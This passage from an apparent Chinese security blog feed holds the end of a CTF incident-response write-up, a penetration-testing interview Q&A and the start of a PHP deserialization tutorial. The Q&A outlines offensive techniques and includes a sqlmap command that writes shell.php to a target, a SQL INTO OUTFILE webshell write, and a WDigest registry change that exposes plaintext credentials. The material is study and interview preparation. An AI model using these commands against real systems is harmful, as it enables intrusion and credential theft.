class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看这些目录是否有文件，很可能有提权</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>修复</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>在my.ini中添加如上设置，不允许导入和导出。</p><p>进行mysql日志分析，通过定位sys_eval来查找攻击者进行了哪些操作</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>只进行了添加用户的操作</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>直接删除该用户</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>查杀websehll</p><p>使用日志分析工具</p><p>（跟踪ip的访问）</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>后门查杀</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>木马位置在启动项</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>通过资源监视器得到该木马外联地址</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面经</title>
      <link href="/2023/05/31/%E9%9D%A2%E7%BB%8F/"/>
      <url>/2023/05/31/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><ul><li>在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</li></ul><p>(1)丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台</p><p>(2)用邮箱做关键词进行丢进搜索引擎</p><p>(3)利用搜索到的关联信息找出其他邮箱进而得到常用社交账号</p><p>(4)社工找出社交账号，里面或许会找出管理员设置密码的习惯</p><p>(5)利用已有信息生成专用字典</p><p>(6)观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</p><ul><li><p>信息收集如何处理子域名爆破的泛解析问题？</p><p><img src="/../images/image-20230616165230965.png" alt="image-20230616165230965"></p></li><li><p>如何绕过CDN找到真实IP，请列举五种方法 (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">国外ping，因为大多数企业不会在国外搭设CDN</span><br><span class="line">DNS解析记录，可以找未搭设CDN时的ip</span><br><span class="line">二级域名法，因为可能只给主站搭设了CDN</span><br><span class="line">历史域名法，不使用的旧域名通常不会有CDN，并且没有过期的话就可以</span><br><span class="line">邮箱法，邮箱服务器真实ip</span><br></pre></td></tr></table></figure></li><li><p>redis未授权访问如何利用，利用的前提条件是? (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绝对路径写入webshell</span><br><span class="line">ssh公钥：需要存在.ssh目录</span><br><span class="line">crontab定时任务：低版本redis（才会是root权限），系统为Centos（因为redis写文件644，ubuntu要执行定时任务必须600）</span><br><span class="line"></span><br><span class="line">主从复制：是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">通过同步功能，将恶意os文件复制到从节点达到RCE</span><br></pre></td></tr></table></figure></li><li><p>mysql提权方式有哪些?利用条件是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mof : windows server 2003 mof脚本被系统定时执行，写入恶意vbs脚本</span><br><span class="line">udf ： 用户自定义函数，导入恶意dll从而RCE</span><br><span class="line">Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</span><br><span class="line"></span><br><span class="line">启动项提权</span><br><span class="line">反弹shell</span><br></pre></td></tr></table></figure></li><li><p>windows+mysql，存在sql注入，但是机器无外网权限，可以利用吗? (★)</p></li><li><p>常用的信息收集手段有哪些，除去<code>路径扫描</code>，<code>子域名爆破</code>等常见手段，有什么猥琐的方法收集企业信息? (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">见渗透测试流程</span><br></pre></td></tr></table></figure></li><li><p><code>SRC挖掘</code>与<code>渗透测试</code>的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 (★★)</p><p><img src="/../images/image-20230404125508806-1686810531409.png" alt="image-20230404125508806"></p></li><li><p>存储xss在纯内网的环境中，可以怎么利用？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xss本质上是任意js代码执行，xss可以修改网站页面，甚至可以扫描端口，如果你也在内网，可以嗅探密码等等。</span><br></pre></td></tr></table></figure></li><li><p>mssql中，假设为sa权限，如何不通过<code>xp_cmdshell</code>执行系统命令 (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sp_oacreate</span><br><span class="line">CLR</span><br></pre></td></tr></table></figure></li><li><p>假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf&#x2F;物理waf) (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">云waf，绕过域名解析，找到真实ip；</span><br><span class="line"></span><br><span class="line">物理waf，前后端解析不一致如编码绕过，多数据来源绕过，参数污染，http协议绕过如分块传输.畸形请求方式，长连接，chrest编码，waf性能如脏数据，高并发，waf机制如白名单绕过，静态文件绕过</span><br></pre></td></tr></table></figure></li></ul><h2 id="Web安全相关"><a href="#Web安全相关" class="headerlink" title="Web安全相关"></a>Web安全相关</h2><ul><li><p>介绍一下自认为有趣的挖洞经历（或CTF经历）(★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf+redis</span><br><span class="line"></span><br><span class="line">打开网站是一个翻译界面，url过滤不充分，dict,file等协议都过滤了，但是没有过滤http协议。直接用burp的intruder模块爆破以下，发现有一个主机存活，然后再对这个主机进行端口扫描，6379端口开放。redis服务需要认证，爆破脚本，需要先了解redis的通信协议，将数据包构造成redis能理解的协议。</span><br><span class="line"></span><br><span class="line">php session反序列化，通过切换php session序列化模式，从而导致反序列化getshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">src</span><br><span class="line"></span><br><span class="line">先信息收集，用fofa的证书语法cert搜索到网站，是一个商城系统，然后测试了一下搜索框，加入引号，发现出现了报错，然后想用xpath函数来进行注入，发现函数被过滤了，看那个网站回显应该是安全狗，然后fuzz了一下，发现不能出现括号还有select from连用，用内联注释，插入脏字符和换行+注释绕过了，就写了个tamper脚本开跑。然后收集了信息，发现这个是网站和数据库都在一个服务器上，并且sec_file_rev为空，所以就可以尝试写shell，但是不知道网站的绝对路径，通过读取apache的配置文件得到了网站的绝对路径，就可以写入了，到这就没有继续测试了。</span><br></pre></td></tr></table></figure></li><li><p>CSRF的成因及防御措施（不用token如何解决) (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：web应用程序在用户进行敏感操作时，没有进行身份验证</span><br><span class="line">防御措施：</span><br><span class="line">- 设置Token</span><br><span class="line">- 检验 referer来源</span><br><span class="line">- 加入验证码等</span><br></pre></td></tr></table></figure></li><li><p>CSRF漏洞中jsonp跟cors的跨域区别？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonp只支持get方式的跨域方式</span><br><span class="line">cors支持get和post请求方式</span><br></pre></td></tr></table></figure></li><li><p>SSRF的成因及防御措施 (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：对于请求的url没有进行严格的过滤和限制 ,导致攻击者可以构造恶意的url </span><br><span class="line">防御措施：禁止跳转，对远程服务器的响应做严格的过滤和限制，白名单：请求的ip地址和端口</span><br></pre></td></tr></table></figure></li><li><p>SSRF如何探测非HTTP协议(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以使用gopher，dict，curl，file等协议</span><br></pre></td></tr></table></figure></li><li><p>简述一下SSRF的绕过手法(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url上</span><br><span class="line">-127.0.0.1变形</span><br><span class="line">-字符欺骗</span><br><span class="line">-DNSRebind</span><br><span class="line">-@#绕过，url解析</span><br></pre></td></tr></table></figure></li><li><p>简述一下SSRF中DNSRebind的绕过原理及修复方法(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名解析的a记录有两个，就可以解析到127.0.0.1</span><br><span class="line"></span><br><span class="line">修复方法：</span><br><span class="line">配置本地DNS服务器，避免使用公共DNS服务器</span><br><span class="line">增强认证授权机制,访问时需要其他认证</span><br></pre></td></tr></table></figure></li><li><p>介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了拖取数据库数据，利用方式还有哪些？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：服务器将用户提交的参数错误地拼接到sql语句中，打破了数据区域的边界（数字型不需要）改变了原有的sql执行逻辑，导致攻击者可以执行恶意的sql语句。</span><br><span class="line"></span><br><span class="line">防范：预编译（加了单引号，字段名→字符串）+白名单</span><br><span class="line"></span><br><span class="line">注入方式：联合，报错，堆叠，时间盲注，布尔盲注，order by</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">读写文件 （变量值，物理路径，权限）</span><br><span class="line"></span><br><span class="line">日志getshell</span><br><span class="line"></span><br><span class="line">数据库提权：</span><br><span class="line">mysql-UOF,UDF </span><br><span class="line">sqlserver:XP_CMDSHELL,sp_oacreate</span><br><span class="line"></span><br><span class="line">cilent端任意文件读取（对方有数据库外连）</span><br><span class="line"></span><br><span class="line">dns外带</span><br></pre></td></tr></table></figure></li><li><p>如何通过sql注入写shell,写shell的前提条件是什么?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写文件：</span><br><span class="line">selct &quot;shell&quot;  into  outfile  &quot;绝对路径&quot;；</span><br><span class="line">sqlmap:</span><br><span class="line">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br><span class="line"></span><br><span class="line">日志getshell</span><br><span class="line"></span><br><span class="line">前提条件：</span><br><span class="line">知道网站物理路径</span><br><span class="line">高权限数据库用户</span><br><span class="line">secure_file_priv 为空</span><br></pre></td></tr></table></figure></li><li><p>介绍一下XSS漏洞的种类，dom型XSS和反射XSS的区别是什么?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射型，存储型，dom型</span><br><span class="line">dom型与后端无关只经过前端，反射型需要和后端交互</span><br></pre></td></tr></table></figure></li><li><p>如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html实体转义</span><br></pre></td></tr></table></figure></li><li><p>讲述一下找回密码可能涉及的逻辑漏洞(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以重置任意用户密码</span><br></pre></td></tr></table></figure></li><li><p>假设你是甲方的一名安全工程师，应该如何降低逻辑漏洞的出现率?(★★)</p></li><li><p>oauth认证过程中可能会出现什么问题，导致什么样的漏洞?(★)</p></li><li><p>CSP应该如何使用及配置，有哪些绕过CSP的方式(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>已知某网站存在LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志包含</span><br><span class="line">cve-phpmyadmin，包含数据库文件</span><br><span class="line">php-session文件/临时文件包含（条件竞争）</span><br><span class="line">docker-pearcmd.php 写🐎</span><br></pre></td></tr></table></figure></li><li><p>简述一下XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">引入外部恶意实体，支持如下协议</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230506225044953-1686810531410.png" alt="image-20230506225044953"></p></li></ul><h2 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h2><ul><li><p>PHP中如何使用<code>phar://</code>伪协议触发反序列化，利用场景以及前提条件有哪些?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件操作函数触发</span><br><span class="line">前提条件：目标开启phar扩展,存在危险的类和方法</span><br></pre></td></tr></table></figure></li><li><p>如何绕过<code>php.ini</code>中<code>disable_function</code>的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?(★★★)</p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell管理工具都自带了绕过disable_function的功能</span><br></pre></td></tr></table></figure></li><li><p>文件上传中<code>%00</code>截断的原理是什么，官方是如何设计修复方案的?(★★)</p><p><img src="/../images/image-20230615144441227.png" alt="image-20230615144441227"></p><p><img src="/../images/image-20230615144248486.png" alt="image-20230615144248486"></p></li><li><p>实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些(★★)</p></li><li><p>PHP伪协议的攻击场景有哪些？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件包含：读取源码</span><br><span class="line">phar反序列化</span><br><span class="line">使用filter过滤器构造webshell</span><br></pre></td></tr></table></figure></li><li><p><code>mail</code>函数的攻击面有哪些?(★)</p></li><li><p>如何不通过数字以及字符构造webshell，其原理是什么，此类特性还会造成什么安全问题?(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php特性，支持字母自增</span><br></pre></td></tr></table></figure></li></ul><h2 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h2><ul><li><p><code>ClassLoader</code>是什么? 加载自定义<code>ClassLoader</code>的前提是什么? (★)</p></li><li><p>大概讲一下<code>CommonCollections1</code>的利用链，该利用链有什么样的限制? (★★)</p></li><li><p>fastjson的反序列化和原生反序列化漏洞的区别是什么? (★★)</p><p><img src="/../images/image-20230615145147923.png" alt="image-20230615145147923"></p></li><li><p>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen</span><br><span class="line">filter</span><br><span class="line">servlet</span><br></pre></td></tr></table></figure></li><li><p>单向代码执行链如何实现执行多条语句，如<code>CommonCollections1</code> (★)</p></li><li><p>请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiro框架提供了一个remember me的功能，会对cookie中的remember me的值进行base64解码，aes解密，反序列化  只要能找到aes的密钥就可以构造恶意序列化内容。550密钥硬编码，721用于加密rememberMe Cookie的算法AES-128-CBC存在缺陷 ，攻击者可以通过Padding Oracle 构造出任意序列化数据的有效密文，从而实施反序列化攻击。</span><br><span class="line"></span><br><span class="line">利用链限制</span><br><span class="line">https://paper.seebug.org/1285/#_4</span><br></pre></td></tr></table></figure></li><li><p>冰蝎当中通过Java联动<code>Cobalt Strike</code>上线的原理是什么? (★)</p></li><li><p><code>serialVersionUID</code> 在反序列化中的作用是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体（类）的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。 </span><br></pre></td></tr></table></figure></li></ul><h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><ul><li>简述一下守护进程的概念，如何生成一个守护进程? (★)</li><li>Linux 服务器的安全运维操作有哪些？如何保护 SSH？(★★)</li><li>入侵 Linux 服务器后需要清除哪些日志？(★★)</li><li>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？(★★★)</li><li>从主机的层面，反弹shell如何监控 (★★★)</li><li>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测 (★★)</li><li>A账户创建了权限为766的文件夹<code>adir</code>，该文件夹中有B账户的文件<code>password.txt</code>，权限为B账户的700，请问B账户能否读取到<code>adir/password.txt</code>文件的内容 (★)</li><li>ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?(★)</li><li>Linux中fork的原理是什么，子进程一定会拷贝父进程的资源状态吗？(★★)</li><li>实现R3层HOOK的方式有哪些，R0层的HOOK又有哪些? (★)</li><li>Linux下如何准确实现应用识别，如识别<code>nginx</code> <code>mysql</code>等 (★)</li><li>假设某Linux机器存在命令审计(方法未知)，有哪些可能的绕过方法? (★★)</li><li>Linux常见的提权方法有哪些?(★★)</li><li>僵尸进程和孤儿进程的区别是什么? (★)</li></ul><h2 id="Windows相关"><a href="#Windows相关" class="headerlink" title="Windows相关"></a>Windows相关</h2><ul><li>UAC是如何进行鉴权校验的? BypassUAC的常见方法有哪些? (★★)</li><li>SSDT表是什么，如何在系统中找到SSDT表并进行hook? (★)</li><li>Windows是如何进行权限控制的，具体的权限校验模型是什么? (★)</li></ul><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ul><li><p>psexec的底层实现原理是什么? (★)</p><p>这款工具的初衷是帮助管理员管理大量的机器的，后来被攻击者用来做横向渗透。</p><p><a href="https://tttang.com/archive/1710/#toc_psexec">https://tttang.com/archive/1710/#toc_psexec</a></p><p><a href="https://payloads.online/archivers/2020-04-02/1/">https://payloads.online/archivers/2020-04-02/1/</a></p><p><img src="/../images/image-20230601133356646.png" alt="image-20230601133356646"></p></li><li><p>SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)</p></li><li><p>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)</p></li><li><p>在win10或者winserver2012中，如果需要使用mimikatz，该如何使用，修改注册表后如何在不重启机器的情况下获取NTLM? (★★)</p></li><li><p>域内如何查询员工对应的机器? (★)</p></li><li><p>如何查询域之间的信任关系? (★)</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;    //查询信任域</span><br></pre></td></tr></table></figure><p><img src="/../images/c7327514d30658e4bc2f76366a1d568d.png" alt="img"></p></li><li><p>域控开放的常见端口有哪些?(★)</p></li><li><p>windows内网中ntlm协议认证过程 (★★★)</p><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p></li><li><p>cobalt strike中上线方式有哪些，各自是什么原理，如果需要绕过监控，如何绕? (★★)</p></li><li><p>横向渗透中，wmic如何构造有回显的命令执行? (★★)</p></li><li><p>windows应急响应中，需要查看哪些安全日志ID，分别对应哪些攻防场景，如果该windows主机为域控，又应该查看哪些事件日志? (★★★)</p></li><li><p>golden ticket和sliver ticket的区别是什么? (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黄金票据，获取KDC用户（krbtg用户的hash值）就可以伪造任意用户的黄金票据从而实现对域内任意机器的一个访问。</span><br><span class="line"></span><br><span class="line">白银票据，当获取到域内机器用户的hash值就可以伪造一个真正的白银票据。实现对某个机器特定服务的访问。</span><br><span class="line"></span><br><span class="line">他们两个区别就在黄金票据作用更大获得TGT票据后可以访问任意机器任意服务，白银只能指定机器指定服务。</span><br></pre></td></tr></table></figure></li><li><p>sliver ticket利用的前置条件是什么?(★)</p></li><li><p>在非域主机的情况下，如何快速发现域主机？ (★★)</p></li><li><p>mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装了KB2871997补丁或者系统版本大于windows server 2012时，lsass.exe不保存明文密码不保存明文的密码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用Wdigest Auth，内存中还是会保存系统的明文口令</span><br><span class="line">将下列注册表路径的</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br><span class="line">以下项的</span><br><span class="line">UseLogonCredential</span><br><span class="line">值修改成0或1</span><br><span class="line">0：关闭Wdigest Auth</span><br><span class="line">1：启动Wdigest Auth</span><br></pre></td></tr></table></figure></li><li><p>有没有办法在不重启机器的前提下启用wdigest这个SSPI? (★)</p></li><li><p>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制? (★)</p></li><li><p>windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么? (★)</p></li><li><p>假设拿到了某台域机器的权限，但是机器上并没有域账户，应该如何进行域渗透? (★★)</p></li><li><p>域的初始化配置允许任何域用户登录任意加了域的机器，这是为什么? (★)</p></li><li><p>如何查询域管登录过的机器，查询原理又是什么? (★)</p></li></ul><h2 id="其他安全相关"><a href="#其他安全相关" class="headerlink" title="其他安全相关"></a>其他安全相关</h2><ul><li>RSA加解密流程(★)</li><li>HTTPS是如何实现的(★★)</li><li>如何防护运营商的DNS劫持&#x2F;链路劫持(★★)</li><li>如何防范羊毛党?(★)</li><li>一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理(★★)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>序列化是将对象转化为数据字节流，反序列化是将数据字节流转换成对象。</p><p>例如java采用二进制序列，PHP采用可见字符串序列。</p><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="非类序列化"><a href="#非类序列化" class="headerlink" title="非类序列化"></a>非类序列化</h2><p>相比于类序列化少了对象名长度和对象名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="类序列化"><a href="#类序列化" class="headerlink" title="类序列化"></a>类序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>可以发现序列化时只会序列化类的属性，而不会序列化类的方法。</p></blockquote><h3 id="类属性权限对序列化的影响"><a href="#类属性权限对序列化的影响" class="headerlink" title="类属性权限对序列化的影响"></a>类属性权限对序列化的影响</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果仔细观察会发现protected和private变量序列化后变量名长度发生了变化</p><ul><li><p>s:4:”*b”;</p></li><li><p>s:7:”infoc”</p><p>我们用010打开1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>​可以发现protected序列化后，会在变量名前加上%00*%00</p><p>​而private序列化后，会在变量名前加上%00类名%00</p><blockquote><p>在实际运用中可以用\00（<code>空</code>）用%00代替</p><p>原因：php的<code>urlencode()</code>会自动把<code>空</code>编码成%00</p></blockquote><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p><h3 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类的构造函数，创建类对象时调用</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的析构函数，对象销毁时调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行serialize()时，会先调用这个函数，再调用construct函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行unserialize()时，会先调用这个函数，再调用destruct函数</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当调用的方法不存在时触发</span></span><br><span class="line"><span class="comment">$name: 被调用方法的名字</span></span><br><span class="line"><span class="comment">$arguments：传递给被调用方法的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类被当成字符串时</span></span><br><span class="line"><span class="comment">1.输出对象：echo/print等 </span></span><br><span class="line"><span class="comment">2.函数的参数类型为字符串，将对象作为参数时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 